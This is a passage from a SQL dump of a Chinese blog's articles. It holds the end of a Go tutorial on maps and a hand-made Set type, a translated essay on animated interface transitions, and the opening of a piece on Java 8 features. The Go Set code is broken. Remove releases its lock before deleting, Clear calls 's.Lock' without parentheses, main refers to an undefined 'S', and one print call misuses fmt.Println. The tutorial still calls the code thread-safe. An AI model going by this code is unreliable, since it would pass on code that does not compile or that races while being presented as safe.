然后传递给函数调用它：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := make([]int, 1e6)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>slice = foo(slice)</p>\r\n\r\n<p>func foo(slice []int) []int {<br />\r\n&nbsp;&nbsp;&nbsp; ...<br />\r\n&nbsp;&nbsp;&nbsp; return slice<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Map</strong></p>\r\n\r\n<p><strong>内部机制</strong></p>\r\n\r\n<p>map 是一种无序的键值对的集合。map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。</p>\r\n\r\n<p>map 是一种集合，所以我们可以像迭代数组和 slice 那样迭代它。不过，map 是无序的，我们无法决定它的返回顺序，这是因为 map 是使用 hash 表来实现的。</p>\r\n\r\n<p>map 的 hash 表包含了一个桶集合(collection of buckets)。当我们存储，移除或者查找键值对(key/value pair)时，都会从选择一个桶开始。在映射(map)操作过程中，我们会把指定的键值(key)传递给 hash 函数(又称散列函数)。hash 函数的作用是生成索引，索引均匀的分布在所有可用的桶上。hash 表算法详见：July的博客&mdash;从头到尾彻底解析 hash 表算法</p>\r\n\r\n<p><strong>创建和初始化</strong></p>\r\n\r\n<p>Go 语言中有多种方法创建和初始化 map。我们可以使用内建函数 make 也可以使用 map 字面值：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n// 通过 make 来创建<br />\r\ndict := make(map[string]int)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 通过字面值创建<br />\r\ndict := map[string]string{&quot;Red&quot;: &quot;#da1337&quot;, &quot;Orange&quot;: &quot;#e95a22&quot;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>使用字面值是创建 map 惯用的方法(<a href=\"http://peter.bourgon.org/go-in-production/#formatting-and-style\" target=\"_blank\">为什么不使用make</a>)。初始化 map 的长度依赖于键值对的数量。</p>\r\n\r\n<p>map 的键可以是任意内建类型或者是 struct 类型，map 的值可以是使用 ==操作符的表达式。slice，function 和 包含 slice 的 struct 类型不可以作为 map 的键，否则会编译错误：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\ndict := map[[]string]int{}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Compiler Exception:<br />\r\ninvalid map key type []string</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>使用 map</strong></p>\r\n\r\n<p>给 map 赋值就是指定合法类型的键，然后把值赋给键：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\ncolors := map[string]string{}<br />\r\ncolors[&quot;Red&quot;] = &quot;#da1337&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果不初始化 map，那么就会创建一个 nil map。nil map 不能用来存放键值对，否则会报运行时错误：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nvar colors map[string]string<br />\r\ncolors[&quot;Red&quot;] = &quot;#da1337&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Runtime Error:<br />\r\npanic: runtime error: assignment to entry in nil map</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>测试 map 的键是否存在是 map 操作的重要部分，因为它可以让我们判断是否可以执行一个操作，或者是往 map 里缓存一个值。它也可以被用来比较两个 map 的键值对是否匹配或者缺失。</p>\r\n\r\n<p>从 map 里检索一个值有两种选择，我们可以同时检索值并且判断键是否存在：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nvalue, exists := colors[&quot;Blue&quot;]<br />\r\nif exists {<br />\r\n&nbsp; fmt.Println(value)<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>另一种选择是只返回值，然后判断是否是零值来确定键是否存在。但是只有你确定零值是非法值的时候这招才管用：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nvalue := colors[&quot;Blue&quot;]<br />\r\nif value != &quot;&quot; {<br />\r\n&nbsp; fmt.Println(value)<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>当索引一个 map 取值时它总是会返回一个值，即使键不存在。上面的例子就返回了对应类型的零值。</p>\r\n\r\n<p>迭代一个 map 和迭代数组和 slice 是一样的，使用 range 关键字，不过在迭代 map 时我们不使用 index/value 而使用 key/value 结构：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\ncolors := map[string]string{<br />\r\n&nbsp;&nbsp;&nbsp; &quot;AliceBlue&quot;:&nbsp;&nbsp; &quot;#f0f8ff&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; &quot;Coral&quot;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;#ff7F50&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; &quot;DarkGray&quot;:&nbsp;&nbsp;&nbsp; &quot;#a9a9a9&quot;,<br />\r\n&nbsp;&nbsp;&nbsp; &quot;ForestGreen&quot;: &quot;#228b22&quot;,<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>for key, value := range colors {<br />\r\n&nbsp; fmt.Printf(&quot;Key: %s&nbsp; Value: %s\\n&quot;, key, value)<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果我们想要从 map 中移除一个键值对，使用内建函数 delete(要是也能返回移除是否成功就好了，哎。。。)：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\ndelete(colors, &quot;Coral&quot;)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>for key, value := range colors {<br />\r\n&nbsp; fmt.Println(&quot;Key: %s&nbsp; Value: %s\\n&quot;, key, value)<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>在函数间传递 map</strong></p>\r\n\r\n<p>在函数间传递 map 不是传递 map 的拷贝。所以如果我们在函数中改变了 map，那么所有引用 map 的地方都会改变：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nfunc main() {<br />\r\n&nbsp; colors := map[string]string{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; &quot;AliceBlue&quot;:&nbsp;&nbsp; &quot;#f0f8ff&quot;,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; &quot;Coral&quot;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;#ff7F50&quot;,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; &quot;DarkGray&quot;:&nbsp;&nbsp;&nbsp; &quot;#a9a9a9&quot;,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; &quot;ForestGreen&quot;: &quot;#228b22&quot;,<br />\r\n&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp; for key, value := range colors {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fmt.Printf(&quot;Key: %s&nbsp; Value: %s\\n&quot;, key, value)<br />\r\n&nbsp; }</p>\r\n\r\n<p>&nbsp; removeColor(colors, &quot;Coral&quot;)</p>\r\n\r\n<p>&nbsp; for key, value := range colors {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fmt.Printf(&quot;Key: %s&nbsp; Value: %s\\n&quot;, key, value)<br />\r\n&nbsp; }<br />\r\n}</p>\r\n\r\n<p>func removeColor(colors map[string]string, key string) {<br />\r\n&nbsp;&nbsp;&nbsp; delete(colors, key)<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>执行会得到以下结果：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nKey: AliceBlue Value: #F0F8FF<br />\r\nKey: Coral Value: #FF7F50<br />\r\nKey: DarkGray Value: #A9A9A9<br />\r\nKey: ForestGreen Value: #228B22<br />\r\n&nbsp;&nbsp;&nbsp;<br />\r\nKey: AliceBlue Value: #F0F8FF<br />\r\nKey: DarkGray Value: #A9A9A9<br />\r\nKey: ForestGreen Value: #228B22</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>可以看出来传递 map 也是十分廉价的，类似 slice。</p>\r\n\r\n<p><strong>Set</strong></p>\r\n\r\n<p>Go 语言本身是不提供 set 的，但是我们可以自己实现它，下面就来试试：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\npackage main</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>import(<br />\r\n&nbsp; &quot;fmt&quot;<br />\r\n&nbsp; &quot;sync&quot;<br />\r\n)</p>\r\n\r\n<p>type Set struct {<br />\r\n&nbsp; m map[int]bool<br />\r\n&nbsp; sync.RWMutex<br />\r\n}</p>\r\n\r\n<p>func New() *Set {<br />\r\n&nbsp; return &amp;Set{<br />\r\n&nbsp;&nbsp;&nbsp; m: map[int]bool{},<br />\r\n&nbsp; }<br />\r\n}</p>\r\n\r\n<p>func (s *Set) Add(item int) {<br />\r\n&nbsp; s.Lock()<br />\r\n&nbsp; defer s.Unlock()<br />\r\n&nbsp; s.m[item] = true<br />\r\n}</p>\r\n\r\n<p>func (s *Set) Remove(item int) {<br />\r\n&nbsp; s.Lock()<br />\r\n&nbsp; s.Unlock()<br />\r\n&nbsp; delete(s.m, item)<br />\r\n}</p>\r\n\r\n<p>func (s *Set) Has(item int) bool {<br />\r\n&nbsp; s.RLock()<br />\r\n&nbsp; defer s.RUnlock()<br />\r\n&nbsp; _, ok := s.m[item]<br />\r\n&nbsp; return ok<br />\r\n}</p>\r\n\r\n<p>func (s *Set) Len() int {<br />\r\n&nbsp; return len(s.List())<br />\r\n}</p>\r\n\r\n<p>func (s *Set) Clear() {<br />\r\n&nbsp; s.Lock<br />\r\n&nbsp; defer s.Unlock()<br />\r\n&nbsp; s.m = map[int]bool{}<br />\r\n}</p>\r\n\r\n<p>func (s *Set) IsEmpty() bool {<br />\r\n&nbsp; if s.Len() == 0 {<br />\r\n&nbsp;&nbsp;&nbsp; return true<br />\r\n&nbsp; }<br />\r\n&nbsp; return false<br />\r\n}</p>\r\n\r\n<p>func (s *Set) List() []int {<br />\r\n&nbsp; s.RLock()<br />\r\n&nbsp; defer s.RUnlock()<br />\r\n&nbsp; list := []int{}<br />\r\n&nbsp; for item := range s.m {<br />\r\n&nbsp;&nbsp;&nbsp; list = append(list, item)<br />\r\n&nbsp; }<br />\r\n&nbsp; return list<br />\r\n}</p>\r\n\r\n<p>func main() {<br />\r\n&nbsp; // 初始化<br />\r\n&nbsp; s := New()<br />\r\n&nbsp;<br />\r\n&nbsp; s.Add(1)<br />\r\n&nbsp; s.Add(1)<br />\r\n&nbsp; s.Add(2)</p>\r\n\r\n<p>&nbsp; s.Clear()<br />\r\n&nbsp; if s.IsEmpty() {<br />\r\n&nbsp;&nbsp;&nbsp; fmt.Println(&quot;0 item&quot;)<br />\r\n&nbsp; }<br />\r\n&nbsp;<br />\r\n&nbsp; s.Add(1)<br />\r\n&nbsp; s.Add(2)<br />\r\n&nbsp; s.Add(3)<br />\r\n&nbsp;<br />\r\n&nbsp; if s.Has(2) {<br />\r\n&nbsp;&nbsp;&nbsp; fmt.Println(&quot;2 does exist&quot;)<br />\r\n&nbsp; }<br />\r\n&nbsp;<br />\r\n&nbsp; s.Remove(2)<br />\r\n&nbsp; s.Remove(3)<br />\r\n&nbsp; fmt.Println(&quot;list of all items&quot;, S.List())<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注意我们只是使用了 int 作为键，你可以自己实现用 interface{} 作为键，做成更通用的 Set，另外，这个实现是线程安全的。</p>\r\n\r\n<p><strong>总结</strong></p>\r\n\r\n<p>1.数组是 slice 和 map 的底层结构。<br />\r\n2.slice 是 Go 里面惯用的集合数据的方法，map 则是用来存储键值对。<br />\r\n3.内建函数 make 用来创建 slice 和 map，并且为它们指定长度和容量等等。slice 和 map 字面值也可以做同样的事。<br />\r\n4.slice 有容量的约束，不过可以通过内建函数 append 来增加元素。<br />\r\n5.map 没有容量一说，所以也没有任何增长限制。<br />\r\n6.内建函数 len 可以用来获得 slice 和 map 的长度。<br />\r\n7.内建函数 cap 只能作用在 slice 上。<br />\r\n8.可以通过组合方式来创建多维数组和 slice。map 的值可以是 slice 或者另一个 map。slice 不能作为 map 的键。<br />\r\n9.在函数之间传递 slice 和 map 是相当廉价的，因为他们不会传递底层数组的拷贝。</p>\r\n',0,0,'Go语言中的Array、Slice、Map和Set使用详解',35,NULL,0),(71,0,'20150907135058',2,'<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4671/8c403f89-0bfb-3a50-bae0-7d3442e74685.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<strong>设计师喜欢专注细节。</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">他们用大量时间设计出令人发指的像素级按钮、表单样式、设置页面，把图标打磨得像图钉一样精细。好吧，满分，棒极了，你们这些家伙千万别停手啊。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">但是&hellip;&hellip; 我们需要稍微想想怎么把一个个静止的界面组合在一起。你按下按钮， 然后表单就&hellip;&hellip;会怎样呢？你滑动删除一个条目然后它就那么消失了？那样会显得非常奇怪 且不自然。现实世界中，任何状态的转换都不会如此生硬。总会让人感觉哪出了问题。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">哦，好吧。你们会写上说明 &mdash;&mdash; 比如&ldquo;滑入。&rdquo;&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">如何滑入？飞快？会回弹吗？缓冲滑入？静态界面设计无法为状态之间提供上下文。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">这些人一旦遇到动画和有趣的交互时，通常会抛出一个词&ldquo;愉快的&rdquo;。对这些家伙来说很酷、 棒极了。但是，你猜怎么着？动画一样可以有功能性，它可不只是用来渲染细节。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">动画带出了一个俯瞰维度 &mdash;&mdash; 时间！ 一种不可见的结构将空间整合在一起。你大可不必像 数学白痴一样去理解。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">我们来看看一些简单的想法：&nbsp;</span><br />\r\n<br />\r\n<strong>放慢/缓冲</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">在传统动画里，分画帧决定了主体如何从 A点 移动到 B点。它将惯性加入移动，并且确定剩下的帧序列。 以这25帧插入值，观察第13帧（中间帧）的位置变化。&nbsp;</span></p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4673/f5bee6e0-9e6c-3ec0-9be9-dfc20ba072b1.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">看到了吧！你已经学会了放慢、缓冲。电脑就像傻瓜一样喜欢线性填充间隔，因为它们都是懒汉。一个优秀的动画、动作设计师会花大量的时间与电脑较劲，以确保没有把事情搞砸。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">动画是时间相关的。你可以用各种方式处理空间来得到不同的结果。不过这样已经足够了。 这毕竟不是动画教程，关键在于你对时间和空间艺术的思考。&nbsp;</span><br />\r\n<br />\r\n<strong>一些关于动画在交互中的想法</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">把条目插入到一个列表&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">比方说，你现在正着手于一个实时事件列表，并且想填充实时数据。如果你把它交给 电脑，看起来会是这个样子：&nbsp;</span></p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4675/8e8120fd-a33f-3b84-9077-bf1a4351a46b.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">哎呀，这太粗糙了&hellip;&hellip;&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">将它处理平滑只需要少量帧的动画。如何让它为你的大脑对列表中将要发生的事情提供线索？&nbsp;</span></p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4677/0ac374be-743b-3ee7-b109-09ab409f2b8f.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4679/56efab9a-deac-3e59-8b45-758236ea9181.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">如果添加了一个新条目，列表需要为这个条目腾出空间，然后（来自某个地方的） 新条目填充这个空间。 这样就舒缓多了。由缓进缓出来软化状态的改变。感觉起来更自然了 ，因为我们空间的转换有了上下文 &mdash;&mdash; 正好对应了你在生活中将某个东西添加到一堆东西中的 场景。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">更多想法&nbsp;</span><br />\r\n<br />\r\n<strong>进入列表中</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">有一个典型的、滑动进入列表中项的默认方式。这是一种标准使用方式，但是并不能 反映直观的感觉。&nbsp;</span></p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4681/26d1f3f3-8d9a-3519-b632-2f5cc8ab1a00.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">滑动的方向并不能给你带来视图转换的任何有用线索。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">何不考虑下将列表项看成一个容器，内嵌更多的内容？&nbsp;</span></p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4683/f4bca776-d93a-399e-88e3-364dddfea5eb.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">如果目的是进入并聚焦在列表项上，我们甚至可以在同一个视图内把其它不相关的东西都隐藏掉：&nbsp;</span></p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4685/03e66c77-b12c-368c-a54f-63b5752affc1.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">面包屑导航 &gt; 所有 &gt; 路线 &gt; 进入 &gt; 视图 &gt; 这是最容易让用户迷失的方式。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">保持内嵌的一个好处，就是你不用向用户去解释他已经深入的子视图层级。可以放弃 层级导航，因为用户自己就能看出来。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">当然，上面的想法并不适用于所有场景 &mdash;&mdash; 但是通过这个视角可以引出更多优秀的流程转换解决方案。&nbsp;</span><br />\r\n<br />\r\n<strong>一个已实现的例子 ThingList</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/4689/9719c054-a227-3e8f-a1f2-3154af6521c6.gif\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">ThingList, 是我在 Elepath 与 Kyle Bragger 合作的的一个产品，里面有很多有趣的动效设计。上面的例子说明了我们如何展示一个新的过滤功能。&nbsp;</span><br />\r\n<br />\r\n<strong>建议你关注更多的动效设计的例子：</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你懂的，我真的不能说太多&hellip;&hellip; 天平的一端是非常华丽但单调的界面，另一端充满了过度点缀的花哨动画。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">这是我现在推荐的三个。&nbsp;</span><br />\r\n<br />\r\n<a href=\"http://www.realmacsoftware.com/clear/\" style=\"color: rgb(0, 102, 153); font-family: Helvetica, Tahoma, Arial, sans-serif; font-size: 14px; line-height: 25.2000007629395px; background-color: rgb(247, 247, 247);\" target=\"_blank\">Clear</a><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">：手势紧密地驱动动画。&nbsp;</span><br />\r\n<br />\r\n<a href=\"https://www.getwillcall.com/\" style=\"color: rgb(0, 102, 153); font-family: Helvetica, Tahoma, Arial, sans-serif; font-size: 14px; line-height: 25.2000007629395px; background-color: rgb(247, 247, 247);\" target=\"_blank\">Willcall</a><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">：整体一致，有动感的节奏。界面转换毫无突兀感。体验非常愉快。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">Facebook应用：一致性不是非常好，但在绘制焦点时有些独到的解决方案。具体来说&hellip;&hellip; 一个是进入显示全屏照片时的弹出层，还有一个是在列表中弹出评论输入框。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">对我来说，很多人认为动效设计与时间无关是非常可笑的。动效可以提供更多信息！也许对设计师来说，制作这种原型的工具太过复杂了？&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">这本来是我为Elepath员工写的内部文档，目的是解释我对动效的着迷。毕竟我是个动画工程师。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">我们觉得，如果把这些分享出来供大家讨论，一定会很酷。我很愿意倾听来自其他界面设计师的想法，认真地思考怎样以及为什么要使用动画。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">在这里给我留言吧，或者上推特跟我聊聊：@pasql &hellip;&hellip;要么在branch网站加入讨论：&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">http://branch.com/b/transitional-interfaces-design-ux&nbsp;</span><br />\r\n<br />\r\n<strong>英文出处：<a href=\"https://medium.com/@pasql/transitional-interfaces-926eb80d64e3\" style=\"color: rgb(0, 102, 153);\" target=\"_blank\">Pasquale D&rsquo;Silva</a></strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">译文由</span><a href=\"http://blog.jobbole.com/90362/\" style=\"color: rgb(0, 102, 153); font-family: Helvetica, Tahoma, Arial, sans-serif; font-size: 14px; line-height: 25.2000007629395px; background-color: rgb(247, 247, 247);\" target=\"_blank\">伯乐在线 - 段昕理</a><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;翻译</span></p>\r\n',0,0,'为什么我着迷于动效设计？',25,NULL,0),(72,0,'20150908005847',2,'<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-size:12px\">lambda表达式，lambda表达式，还是lambda表达式。一提到Java 8就只能听到这个，但这不过是其中的一个新功能而已，Java 8还有许多新的特性&mdash;&mdash;有一些功能强大的新类或者新的用法，还有一些功能则是早就应该加到Java里了。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">这里我准备介绍它的10个我个人认为非常值得了解的新特性。总会有一款适合你的，开始来看下吧。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>default方法</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">这是Java语言的一个新特性，现在接口类里可以包含方法体（这就是default方法）了。这些方法会隐式的添加到实现这个接口的每个子类中。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">这使得你可以在不破坏代码的前提下扩展原有库的功能。它绝对是个利器。但从另一个方面来说，这使得接口作为协议，类作为具体实现的界限开始变得有点模糊。但好处就是，它通过一个很优雅的方式使得接口变得更智能，同时还避免了代码冗余，并且扩展类库。不好的地方就是，我估计很快就会看到有在接口方法里获取this引用然后强制转化成某个具体类型的写法了。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>终止进程</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">一旦启动外部进程的话，当这个进程崩溃，挂起，或者CPU到达100%的时候，你就得回来擦屁股了。Process类现在增加了两个新的方法，可以来教训下那些不听话的进程了。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">第一个是isAlive()方法，有了它你可以判断进程是否还活着。第二个方法则更加强大，它叫destroyForcibly()，你可以用它来强制的杀掉一个已经超时或者不再需要的进程。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>StampedLock</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">提到这个不禁有点小激动。没有人会喜欢在代码中使用同步。用了它肯定会降低程序的吞吐量，更糟糕的话还会导致进程挂起。尽管这样，有时候你却不得不选择它。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">当多个进程访问一个资源的时候，有多种方法可以进行同步。其中用得最多的一种是ReadWriteLock以及基于它的几种实现。它通过阻塞写线程的方式来允许多个线程并发的读，这样减少了线程之间的竞争。听起来还不错，但实际上这个锁实在是太太太慢了，尤其是当有许多写线程的时候。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">因此Java 